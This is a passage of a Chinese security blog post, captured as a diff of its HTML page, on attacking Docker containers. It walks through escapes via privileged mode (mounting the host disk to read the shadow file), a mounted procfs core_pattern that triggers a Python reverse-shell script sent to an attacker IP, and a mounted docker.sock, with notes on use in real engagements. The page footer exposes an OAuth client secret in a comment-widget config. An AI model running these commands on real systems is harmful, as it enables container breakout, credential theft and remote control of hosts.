+</li>
+<li><h5 id="特权模式逃逸"><a href="#特权模式逃逸" class="headerlink" title="特权模式逃逸"></a>特权模式逃逸</h5> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">mkdir /test &amp;&amp; mount /dev/sda1 /test<br></code></pre></td></tr></table></figure>
+
+<p> <img src="/assets/image-20241018133806-b0gqjcs.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+</li>
+<li><h5 id="访问宿主机shadow文件"><a href="#访问宿主机shadow文件" class="headerlink" title="访问宿主机shadow文件"></a>访问宿主机shadow文件</h5><p> 宿主机的 <code>shadow</code>​ 文件主要用于存储用户的密码信息，但它并不直接保存明文密码。</p>
+<p> <img src="/assets/image-20241018134139-q0rvfub.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+</li>
+</ol>
+<p>‍</p>
+<p>‍</p>
+<p>‍</p>
+<p>‍</p>
+<h4 id="危险挂载启动"><a href="#危险挂载启动" class="headerlink" title="危险挂载启动"></a>危险挂载启动</h4><p><code>危险启动，适用于java jsp高权限入口无需提权 低权限入口还要提权才能逃逸</code>​</p>
+<h5 id="挂载Procfs"><a href="#挂载Procfs" class="headerlink" title="挂载Procfs"></a>挂载Procfs</h5><ol>
+<li><h6 id="创建一个容器并挂载-proc-目录"><a href="#创建一个容器并挂载-proc-目录" class="headerlink" title="创建一个容器并挂载 &#x2F;proc 目录"></a>创建一个容器并挂载 &#x2F;proc 目录</h6> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker run -it -v /proc/sys/kernel/core_pattern:/host/proc/sys/kernel/core_pattern ubuntu<br></code></pre></td></tr></table></figure>
+
+<p> <img src="/assets/image-20241018160550-btckga3.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+</li>
+<li><h6 id="检测环境"><a href="#检测环境" class="headerlink" title="检测环境"></a>检测环境</h6> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">find / -name core_pattern<br></code></pre></td></tr></table></figure>
+
+<p> 如果找到两个 core_pattern 文件，那可能就是挂载了宿主机的 procfs</p>
+<p> <img src="/assets/image-20241018160749-jnk4itz.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+</li>
+<li><h6 id="找到当前容器在宿主机下的绝对路径"><a href="#找到当前容器在宿主机下的绝对路径" class="headerlink" title="找到当前容器在宿主机下的绝对路径"></a>找到当前容器在宿主机下的绝对路径</h6> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">cat /proc/mounts | grep workdir<br></code></pre></td></tr></table></figure>
+
+<p> <img src="/assets/image-20241018160911-yeawyso.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+</li>
+<li><h6 id="写入文件"><a href="#写入文件" class="headerlink" title="写入文件"></a>写入文件</h6><p> 直接复制粘贴到命令行</p>
+ <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs shell">cat &gt;/tmp/.x.py &lt;&lt; EOF<br><span class="hljs-meta prompt_">#</span><span class="language-bash">!/usr/bin/python</span><br>import os<br>import pty<br>import socket<br>lhost = &quot;xx.xx.xx.xx&quot;  //反弹IP<br>lport = xxxx //反弹端口<br>def main():<br>    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    s.connect((lhost, lport))<br>    os.dup2(s.fileno(), 0)<br>    os.dup2(s.fileno(), 1)<br>    os.dup2(s.fileno(), 2)<br>    os.putenv(&quot;HISTFILE&quot;, &#x27;/dev/null&#x27;)<br>    pty.spawn(&quot;/bin/bash&quot;)<br>    os.remove(&#x27;/tmp/.x.py&#x27;)<br>    s.close()<br>if __name__ == &quot;__main__&quot;:<br>    main()<br>EOF<br></code></pre></td></tr></table></figure>
+
+<p> 检测是否写入文件</p>
+<p> <img src="/assets/image-20241018161329-8a6szgj.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p> 给文件权限</p>
+ <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">chmod +x /tmp/.x.py<br></code></pre></td></tr></table></figure>
+
+<p> 将刚才的绝对路径复制过来</p>
+ <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">echo -e &quot;|/var/lib/docker/overlay2/4aac278b06d86b0d7b6efa4640368820c8c16f1da8662997ec1845f3cc69ccee/merged/tmp/.x.py \rcore           &quot; &gt; /host/proc/sys/kernel/core_pattern<br>//这里的路径要替换为workdir的绝对路径<br></code></pre></td></tr></table></figure>
+
+<p> 写入文件</p>
+<p> 直接复制粘贴到命令行</p>
+ <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">cat &gt;/tmp/x.c &lt;&lt; EOF<br><span class="hljs-meta prompt_">#</span><span class="language-bash">include &lt;stdio.h&gt;</span><br>int main(void)<br>&#123;<br>    int *a = NULL;<br>    *a = 1;<br>    return 0;<br>&#125;<br>EOF<br></code></pre></td></tr></table></figure></li>
+<li><h6 id="编译文件并执行"><a href="#编译文件并执行" class="headerlink" title="编译文件并执行"></a>编译文件并执行</h6> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">cd /tmp<br>gcc x.c -o x  //编译c文件<br></code></pre></td></tr></table></figure>
+
+ <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">apt-get update -y &amp;&amp; apt-get install  gcc -y <br>//实战中不推荐安装gcc环境，可以在linux上编译好后上传到容器中执行就行<br></code></pre></td></tr></table></figure>
+
+<p> <img src="/assets/image-20241018162240-pmmvjep.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p> 执行文件</p>
+ <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">./x  <br></code></pre></td></tr></table></figure>
+
+<p> 此时攻击机记得监听端口</p>
+ <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nc -lvvp xxxx<br></code></pre></td></tr></table></figure></li>
+</ol>
+<p>‍</p>
+<h5 id="挂载Socket"><a href="#挂载Socket" class="headerlink" title="挂载Socket"></a>挂载Socket</h5><ol>
+<li><h6 id="创建一个容器并挂载-var-run-docker-sock-文件"><a href="#创建一个容器并挂载-var-run-docker-sock-文件" class="headerlink" title="创建一个容器并挂载 &#x2F;var&#x2F;run&#x2F;docker&#x2F;sock 文件"></a>创建一个容器并挂载 &#x2F;var&#x2F;run&#x2F;docker&#x2F;sock 文件</h6> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker run -itd --name with_docker_sock -v /var/run/docker.sock:/var/run/docker.sock ubuntu<br></code></pre></td></tr></table></figure></li>
+<li><h6 id="进入环境"><a href="#进入环境" class="headerlink" title="进入环境"></a>进入环境</h6> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker exec -it with_docker_sock /bin/bash<br>这条命令是进入命令行，实战中用不到，这里是为了模拟环境<br></code></pre></td></tr></table></figure></li>
+<li><h6 id="检测是否存在漏洞特征文件"><a href="#检测是否存在漏洞特征文件" class="headerlink" title="检测是否存在漏洞特征文件"></a>检测是否存在漏洞特征文件</h6> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ls -lah /var/run/docker.sock<br></code></pre></td></tr></table></figure>
+
+<p> 如果存在这个文件，说明漏洞可能存在</p>
+<p> <img src="/assets/image-20241018163047-wd4xsiz.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+</li>
+<li><h6 id="挂载逃逸"><a href="#挂载逃逸" class="headerlink" title="挂载逃逸"></a>挂载逃逸</h6> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">apt-get update<br>apt-get install curl<br>curl -fsSL https://get.docker.com/ | sh<br><br>第三条命令就是在官网安装ubuntu，这里我的kali没有配置代理，用的下面的命令（配置了国内镜像源）<br>apt-get install docker-ce<br></code></pre></td></tr></table></figure>
+
+<h6 id="在容器内部创建一个新的容器，并将宿主机目录挂载到新的容器内部"><a href="#在容器内部创建一个新的容器，并将宿主机目录挂载到新的容器内部" class="headerlink" title="在容器内部创建一个新的容器，并将宿主机目录挂载到新的容器内部"></a>在容器内部创建一个新的容器，并将宿主机目录挂载到新的容器内部</h6> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker run -it -v /:/host ubuntu /bin/bash<br></code></pre></td></tr></table></figure>
+
+<p> <img src="/assets/image-20241018164931-t6dz002.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p> 退出也需要两次</p>
+<p> <img src="/assets/image-20241019113721-ynoe7dq.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+</li>
+</ol>
+<p>‍</p>
+<p>‍</p>
+<h4 id="docker自身版本漏洞-系统内核漏洞"><a href="#docker自身版本漏洞-系统内核漏洞" class="headerlink" title="docker自身版本漏洞&amp;系统内核漏洞"></a>docker自身版本漏洞&amp;系统内核漏洞</h4><p><code>软件版本漏洞和系统漏洞 高低权限都可用</code>​</p>
+<p>主要是CVE复现</p>
+<p>这里附上自动化项目</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/cdk-team/CDK">https://github.com/cdk-team/CDK</a></p>
+<p>注：不支持系统内核漏洞！！</p>
+<p><img src="/assets/image-20241018165529-bff7isi.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>‍</p>
+<p>‍</p>
+<p>‍</p>
+<h2 id="K8s安全"><a href="#K8s安全" class="headerlink" title="K8s安全"></a>K8s安全</h2><p>这里环境出问题了，之后看搭建视频重新搭一下</p>
+<p>‍</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E4%BA%91%E4%B8%8A%E6%94%BB%E9%98%B2%E3%80%81/" class="category-chain-item">云上攻防、</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E4%BA%91%E4%B8%8A%E6%94%BB%E9%98%B2/" class="print-no-link">#云上攻防</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>云上攻防</div>
+      <div>http://example.com/2024/09/30/云上攻防/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>0z-sIHN</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年9月30日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/09/30/API%E6%94%BB%E9%98%B2/" title="API攻防">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">API攻防</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/09/15/APP%E6%94%BB%E9%98%B2/" title="APP攻防">
+                        <span class="hidden-mobile">APP攻防</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="gitalk-container"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#gitalk-container', function() {
+      Fluid.utils.createCssLink('/css/gitalk.css')
+      Fluid.utils.createScript('https://lib.baomitu.com/gitalk/1.8.0/gitalk.min.js', function() {
+        var options = Object.assign(
+          {"clientID":"Ov23liT0OJSQBYUz81HU","clientSecret":"02c5c39d96d158a8a34967805e40cb90a7b2f1cf","repo":"0z-sihn.github.io","owner":"0z-sIHN","admin":["0z-sIHN"],"language":"zh-CN","labels":["Gitalk"],"perPage":10,"pagerDirection":"last","distractionFreeMode":true,"createIssueManually":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token"},
+          {
+            id: '0457f492086db5a8111f3b0d3570b819'
+          }
+        )
+        var gitalk = new Gitalk(options);
+        gitalk.render('gitalk-container');
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+<div>
+  <span id="timeDate">正在载入天数...</span>
+  <span id="times">载入时分秒...</span>
+  <script>
+  var now = new Date();
+  function createtime(){
+      var grt= new Date("11/10/2024 22:36:00");
+      now.setTime(now.getTime()+250);
+      days = (now - grt ) / 1000 / 60 / 60 / 24;
+      dnum = Math.floor(days);
+      hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum);
+      hnum = Math.floor(hours);
+      if(String(hnum).length ==1 ){
+          hnum = "0" + hnum;
+      }
+      minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+      mnum = Math.floor(minutes);
+      if(String(mnum).length ==1 ){
+                mnum = "0" + mnum;
+      }
+      seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+      snum = Math.round(seconds);
+      if(String(snum).length ==1 ){
+                snum = "0" + snum;
+      }
+      document.getElementById("timeDate").innerHTML = "🚀已持续航行&nbsp"+dnum+"&nbsp天";  
+      document.getElementById("times").innerHTML = hnum + "&nbsp时&nbsp" + mnum + "&nbsp分&nbsp" + snum + "&nbsp秒";
+  }
+  setInterval("createtime()",250);
+  </script>
+</div>
+
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  
+<script src="/diy_js/typing-effect.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
